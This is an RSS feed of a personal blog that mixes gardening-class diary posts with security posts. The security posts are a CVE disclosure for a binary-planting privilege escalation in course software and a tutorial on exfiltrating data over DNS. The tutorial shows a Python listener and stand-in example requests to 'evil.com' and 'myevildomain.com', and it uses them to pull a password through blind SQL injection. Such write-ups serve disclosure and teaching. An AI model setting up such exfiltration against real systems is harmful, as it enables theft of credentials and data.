<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>John Woodman's Security Blog</title>
    <description>I'm a security enthusiast looking for new ways to break stuff and stay hidden while doing it. All content posted here is for educational and research purposes only. </description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>John Woodman</name>
      <email>john.woodman11@gmail.com</email>
      <uri>https://google.com/</uri>
    </author>
    
      <item>
        <title>Week 6&amp;#58; Pinch</title>
        <description>&lt;h2 id=&quot;casualty&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Casualty&lt;/h2&gt;
&lt;p&gt;One of my bell pepper seedlings has unfortunately suffered a casualty. While on the window sill, the blinds fell directly onto my germination station, cutting one of the bell pepper seedlings in half. All that remains is the stem. I’ve left it there and have continued to water it in hopes that it may still survive. RIP for now, bell pepper seedling. Forever in our hearts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-11-Week-6/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;almost-ready-to-transplant&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Almost Ready To Transplant&lt;/h2&gt;
&lt;p&gt;Other than the one casualty, my other basil and bell pepper seedlings are looking really good! I don’t think they are quite ready to be transplanted yet, as they don’t have clear Cotyledons just yet, but I imagine in the coming week, it’ll be time to move them to the main garden.&lt;/p&gt;

&lt;h2 id=&quot;garden-growth&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Garden Growth&lt;/h2&gt;
&lt;p&gt;The garden itself looks to be doing pretty well! The plants are growing slower than I expected, but I think that tends to happen when they start developing more. Another of my onions have sprouted! The pole beans are now by far the largest plant in the garden. The sunflowers aren’t looking too great, they’ve become very twisty and fallen over quite a bit. Zinnia have started growing smaller leaves and the radishes are doing great! Below is a picture of the garden so far.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-11-Week-6/2.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 11 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-6/</link>
        <link href="/posts/Week-6/"/>
        <guid isPermaLink="true">/posts/Week-6/</guid>
      </item>
    
      <item>
        <title>CVE-2020-26894 Privilege Escalation Vulnerability in Faulkner Press &quot;Wildlife Issues in the New Millennium&quot;</title>
        <description>&lt;p&gt;While taking a Wildlife Issues course at my University, I discovered a high severity vulnerability in the course software our class was using that leads to a horizontal privilege escalation.&lt;/p&gt;

&lt;p&gt;“Wildlife Issues in the New Millennium” v18.0.160 is vulnerable to an elevation of privilege vulnerability. During the startup, the application will execute attempt to execute “C:\Course Software Material 18.0.1.9\cmd.exe” if it exists. By default on Windows, low privileged users are able to create folders under the root level drives, including the C: drive. A low privileged user also has the ability to write to “C:\Course Software Material 18.0.1.9&quot;. Therefore, a low privileged user can create a malicious “cmd.exe” in that folder, which will be executed every time “Wildlife Issues in the New Millenium” starts by any user on the system. The malicious binary is executed in the background without the user’s knowledge. This would be an example of horizontal privilege escalation, as it will assume the privileges of which ever user starts up the software.&lt;/p&gt;

&lt;p&gt;After contacting the vendor, the vulnerability has been patched in the newest version of the course software.&lt;/p&gt;

&lt;p&gt;Mitre assigned &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26894&quot;&gt;CVE-2020-26894&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;steps-to-reproduce&quot;&gt;&lt;a href=&quot;#header-8&quot;&gt;&lt;/a&gt;Steps to Reproduce&lt;/h2&gt;

&lt;p&gt;Execute the following command in a CMD window:&lt;/p&gt;

&lt;p&gt;copy C:\Windows\System32\calc.exe “C:\Course Software Material 18.0.1.9\cmd.exe”&lt;/p&gt;

&lt;p&gt;Now open “Wildlife Issues in the New Millennium” and calc will be popped with the same permissions as the user that started it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-06-Privilege-Escalation-Vulnerability-Faulkner-Press/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 06 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Privilege-Escalation-Vulnerability-Faulkner-Press/</link>
        <link href="/posts/Privilege-Escalation-Vulnerability-Faulkner-Press/"/>
        <guid isPermaLink="true">/posts/Privilege-Escalation-Vulnerability-Faulkner-Press/</guid>
      </item>
    
      <item>
        <title>Week 5&amp;#58; Irrigation</title>
        <description>&lt;h2 id=&quot;everything-is-growing&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Everything is Growing!&lt;/h2&gt;
&lt;p&gt;One of my onions finally sprouted and is visible through the soil! It’s now official: every type of plant I’ve sowed has sprouted! The radishes and pole beans sprouted very quickly, much quicker than any of the others had. My garden is starting to look more and more like a garden everyday :). The sunflowers are still the tallest, but they’ve started drooping a little, so I’ll have to keep a watch on them. Below is a picture of my garden and me watering them. I poked holes in the top of a plastic milk gallon to use as watering can.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-01-Week-5/1.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-10-01-Week-5/2.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;lettuce-wait&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Lettuce Wait&lt;/h2&gt;
&lt;p&gt;I started germinating lettuce seeds this week. I placed 2 in 2 separate peat pellets and placed them inbetween the basil and bell peppers. From what I’ve read, lettuce grows farily easily, so fingers crossed that it’s the same for me. I had to kill some of the basil and bell pepper seedlings, because they can’t all survive together in the peat pellet. Below is a picture of my egg carton with the germinating plants. 
&lt;img src=&quot;/assets/2020-10-01-Week-5/3.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When I told my roommates about this gardening class, and now that they’ve seen the progress I’ve made so far, they want to take the class next semester! I’m hoping to continue growing plants even after this class has ended, so it will be fun to have people to grow plants with.&lt;/p&gt;
</description>
        <pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-5/</link>
        <link href="/posts/Week-5/"/>
        <guid isPermaLink="true">/posts/Week-5/</guid>
      </item>
    
      <item>
        <title>Week 4&amp;#58; Outdoor</title>
        <description>&lt;h2 id=&quot;theyre-growing&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;They’re Growing!&lt;/h2&gt;
&lt;p&gt;Quite a lot happened this past week. After watering the seeds I planted daily, some of them broke ground! The sunflowers were the first to come up, growing way faster than any of the others. The basil was the next to come, still inside the peat pellets. Then, just a couple days ago, the zinnia broke through! The onion starters still haven’t broken through yet, but I’m guessing those take longer to grow than the others, given the size. The bell peppers seeds still haven’t come up in the peat pellets, which I’m a little worried about. I’m going to continue to water them and see what happens. Below you can see pictures of all the plants that have started growing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-24-Week-4/1.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/2.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/3.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/4.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;newcomers&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Newcomers&lt;/h2&gt;
&lt;p&gt;This week, I also planted some new seeds. I planted radish (6 seeds), and pole beans (4 seeds). I placed the radish along the side of the garden, close to the wall, and the pole beans next to the sunflowers. Below is a picture of my garden layout.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-24-Week-4/5.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, I think planting wasn’t as difficult as I thought it was going to be. I expected to have almost nothing growing and having it be due to some issue like not having enough potting mix, or not enough sunlight or water. But it’s turning out pretty well so far, so fingers crossed that it continues! :)&lt;/p&gt;
</description>
        <pubDate>Thu, 24 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-4/</link>
        <link href="/posts/Week-4/"/>
        <guid isPermaLink="true">/posts/Week-4/</guid>
      </item>
    
      <item>
        <title>Week 3&amp;#58; Germination</title>
        <description>&lt;h2 id=&quot;germination&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Germination&lt;/h2&gt;
&lt;p&gt;This week I finally started germinating my seeds. This is something I’ve never done before, so the whole process was very new to me. I started planting the following seeds:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bell Peppers&lt;/li&gt;
  &lt;li&gt;Zinnia&lt;/li&gt;
  &lt;li&gt;Sun Flowers&lt;/li&gt;
  &lt;li&gt;Basil&lt;/li&gt;
  &lt;li&gt;Onion starters&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I germinated the bell peppers and basil seeds in peat pellets, which I placed indoors inside of an egg carton. This will allow it to grow enough to be transplanted to the main garden. The sun flower and zinnia seeds, as well as the onion starters were planted directly into the garden. I placed the sun flowers seeds a few inches apart and about 1/2 inch deep, the zinnia seeds a few inches apart and about 1/4 inch deep, and the oinon starter close together and about an inch deep into the soil.&lt;/p&gt;

&lt;p&gt;I’m watering the peat pellets regularly, as they need to be well watered in order to grow enough to be transplanted. It should take about 7 days for it to be grown enough for transplanting. I’m watering the garden on a regular basis as well, but not as often as the peat pellets. Below is a picture of the peat pellets in the egg carton, as well as a picture of the garden (I added plant labels so I don’t forget what I planted where, and my awesome roommate contributed a nice little scarecrow):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-16-Week-3/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-16-Week-3/2.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-3/</link>
        <link href="/posts/Week-3/"/>
        <guid isPermaLink="true">/posts/Week-3/</guid>
      </item>
    
      <item>
        <title>Week 2&amp;#58; Green Thumb</title>
        <description>&lt;h2 id=&quot;my-background&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;My Background&lt;/h2&gt;
&lt;p&gt;This is my first time gardening, and actually my first time dealing with any sort of plant care, so I’m very new to this, but also very excited to learn. I’ve always sort of imagined my older self having a small garden in my backyard where I would grow food that I would use for my meals, being as environmentally friendly as I could. I’m hoping this class will be a good introduction for me, and help me better understand the works that will go in to maintaining a garden.&lt;/p&gt;

&lt;h2 id=&quot;what-i-hope-to-learn&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What I Hope To Learn&lt;/h2&gt;
&lt;p&gt;Like I said earlier, my goal for this class is to get a solid understanding of how to maintaing a basic garden. I’m hoping I can learn how to grow all the various types of food, from herbs to vegetables and fruits, or at the very least, be given the foundational knowledge I need to continue learning about gardening. I also hope to learn more about how my gardening can be an environmental benefit, such as re-using food I would usually throw away for my garden.&lt;/p&gt;

&lt;h2 id=&quot;beginning-stages&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Beginning Stages&lt;/h2&gt;
&lt;p&gt;Below is a picture of my garden setup so far. I cut together some pieces of wood for the walls, and used a wooden plank for the floor. I plan on grabbing some garbage bags to put between the soil and the wood, to prevent too much leaking and potentially warped wood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-11-Week-2/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once I get the fertilizer and seeds, I can start growing!&lt;/p&gt;

</description>
        <pubDate>Fri, 11 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-2/</link>
        <link href="/posts/Week-2/"/>
        <guid isPermaLink="true">/posts/Week-2/</guid>
      </item>
    
      <item>
        <title>Week 1&amp;#58; Salad Inventory</title>
        <description>&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Welcome to my first gardening blog post. I plan on documenting my progress as I begin learning and growing my own 2.5ft x 2.5ft garden. This week to help me learn more about the different parts of a plant, I will be documenting an inventory of the last salad I ate, picking out which parts of the salad were leaves, flowers, roots, stems, or fruits.&lt;/p&gt;

&lt;h2 id=&quot;salad-inventory&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Salad Inventory&lt;/h2&gt;
&lt;p&gt;Below is a list of everything that was in my last salad, classified by their botanical definition:&lt;/p&gt;

&lt;h3 id=&quot;fruits&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fruits&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Tomatoes&lt;/li&gt;
  &lt;li&gt;Cucumber&lt;/li&gt;
  &lt;li&gt;Avocado&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;leaves&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Leaves&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Lettuce&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;flowers&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Flowers&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Broccoli&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’m still in the process of building the 2.5ft x 2.5ft garden, but once it’s done I’ll have another post coming next week so stay tuned :)&lt;/p&gt;
</description>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-1/</link>
        <link href="/posts/Week-1/"/>
        <guid isPermaLink="true">/posts/Week-1/</guid>
      </item>
    
      <item>
        <title>Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)</title>
        <description>&lt;p&gt;Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it’s as simple as scp’ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isn’t on it (obviously)? Another method is still possible: DNS.&lt;/p&gt;

&lt;p&gt;In this post, I’ll be showing how I set up a public malicious (depending on how you use it) DNS server for exfiltrating data without actually having to run a DNS server ;).&lt;/p&gt;

&lt;h2 id=&quot;what-is-dns-exfiltration&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;What Is DNS Exfiltration?&lt;/h2&gt;

&lt;p&gt;The general idea of DNS exfiltration isn’t unsimilar to exfiltrating data through HTTP web requests. Sensitive data is attached to a DNS query that can then be viewed by our malicious DNS server. In this case, the sensitive data is prepended onto the subdomain of our controlled public domain. For example, if we were able to access the password of a user on a victim’s machine, in order to exfil that data, we would have the victim machine make a DNS request for password123.myevildomain.com, with the “password123” being the victim’s password. Since own myevildomain.com, the request to resolve password123 would come to my server. The best part is, I don’t even have to actually respond to the request since I’ve already got what I came for.&lt;/p&gt;

&lt;h2 id=&quot;what-youll-need&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What You’ll Need&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Public Server you control (I used a digital ocean server)&lt;/li&gt;
  &lt;li&gt;Public domain name linked to that server&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;setting-up-the-pulbic-domain&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Setting Up The Pulbic Domain&lt;/h2&gt;

&lt;p&gt;The first thing you need is a publicly registered domain. You can do this on a number of sites, but I used godaddy to register john-woodman.com and pointed it to my digitalocean server.&lt;/p&gt;

&lt;h3 id=&quot;creating-a-hostname-for-our-nameserver&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Creating A Hostname For Our Nameserver&lt;/h3&gt;
&lt;p&gt;Once I registered the domain, I then added my own hostname as a nameserver through godaddy. The reason I had to do this is because nameserver records can’t specify an IP address, it must be a hostname. I made the hostname for the nameserver ns.john-woodman.com and pointed it to my digitalocean server IP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;setting-nameservers-to-digitaloceans&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Setting Nameservers To DigitalOcean’s&lt;/h3&gt;
&lt;p&gt;DigitalOcean actually has the ability to manage DNS records for you. While I could do everything on godaddy or whichever name resolution service you chose, I found DigitalOcean has a nice, simple interface. In godaddy, I set the custom nameservers to DigitalOcean’s so that any DNS requests made to john-woodman.com would go to DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/2.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have that setup, we can do everything else on DigitalOcean.&lt;/p&gt;

&lt;h3 id=&quot;redirecting-subdomain-requests&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Redirecting Subdomain Requests&lt;/h3&gt;
&lt;p&gt;I now have to create a few DNS records so that any requests to a specific subdomain will be redirected to my DNS Server instead of being handled by DigitalOcean’s. I first have to create an A record that points all requests to john-woodman.com to my IP (this is mostly to keep my website up and running). I then have to create an A record that points the nameserver domain (ns.john-woodman.com) to my server’s IP. Now, unfortunately, with NS records, I’m not able to specify a wildcard in the subdomain (such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;.john-woodman.com). From what I can gather, it seems to just not be supported by DNS, with no reason why. Either way, we can get around this by actually just specifying any name for the subdomain, and all subdomain requests sent to that subdomain (subception) will be directed to our DNS server. In my case, I chose a completely random subdomain steve.john-woodman.com. You can call it whatever you want (probably best not to have special characters just to be safe). So when im exfiltrating data, the DNS request would look like for example: password123.steve.john-woodman.com. This is what my DNS configuration looks like on DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/3.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-listener&quot;&gt;&lt;a href=&quot;#header-7&quot;&gt;&lt;/a&gt;Setting Up The Listener&lt;/h2&gt;
&lt;p&gt;The nice part is we don’t actually have to run any DNS service on our server. We can just set up a simple python listener, sift through the data we recieve and grab what we need. Below is the code I wrote to listen on UDP port 53 (DNS requests come in on UDP for the most part).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dnslib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;testing-and-exploiting&quot;&gt;&lt;a href=&quot;#header-8&quot;&gt;&lt;/a&gt;Testing and Exploiting&lt;/h2&gt;
&lt;p&gt;To make sure that it works, I can run a simple nslookup and see if my listener picks up the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/4.png&quot; alt=&quot;&quot; height=&quot;80%&quot; width=&quot;80%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nslookup failed, but thats expected since for one, we don’t actually have any DNS service running, and second, the requested subdomain doesn’t exist. But as you can see, our server did recieve the request and, most importantly, we can see the subdomain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/5.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploiting&quot;&gt;&lt;a href=&quot;#header-9&quot;&gt;&lt;/a&gt;Exploiting&lt;/h2&gt;
&lt;p&gt;To really fully test our setup, I created a simple vulnerable webserver with a login page connected to a PostgreSQL database that contains login credentials. The webserver is vulnerable to SQL injection, but no output is returned to the user. There’s a few different methods I could use (time-based for example), but why not use DNS exfiltration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/6.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I won’t go into the exploit itself, but you can read about it &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind&quot;&gt;here&lt;/a&gt;. Using Burp, I sent the URL encoded exploit that retrieved the password from the SQL table and sent it as the subdomain in the DNS request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/7.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the listener running on our server, we recieved the DNS request and can see the password that was stored in the PostgreSQL database set as the subdomain!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/8.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-10&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The inspiration for this project was trying to run my own server for DNS exfiltration instead of having to pay for the pro version of BurpSuite, which has a BurpCollaborator that will do this for you. I learned a lot more about DNS through this project, and I hope I was able to help you learn something too!&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2020 00:00:00 +0000</pubDate>
        <link>//posts/DNS-Exfiltration-Setup/</link>
        <link href="/posts/DNS-Exfiltration-Setup/"/>
        <guid isPermaLink="true">/posts/DNS-Exfiltration-Setup/</guid>
      </item>
    
      <item>
        <title>HackTheBox&amp;#58; Writeup</title>
        <description>&lt;h3 id=&quot;box-type-linux&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Box Type: Linux&lt;/h3&gt;
&lt;h2 id=&quot;getting-user&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Getting User&lt;/h2&gt;
&lt;p&gt;Nmap scan showed ports 22 and 80 open.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture.PNG&quot; alt=&quot;&quot; height=&quot;65%&quot; width=&quot;65%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking out the website shows a notification that some sort of DoS protection is running on the webserver, likely preventing any dictionary or brute force attacks, which means no dirb :(.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture2.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Nmap scan did show a robots.txt, however:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture3.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%px&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

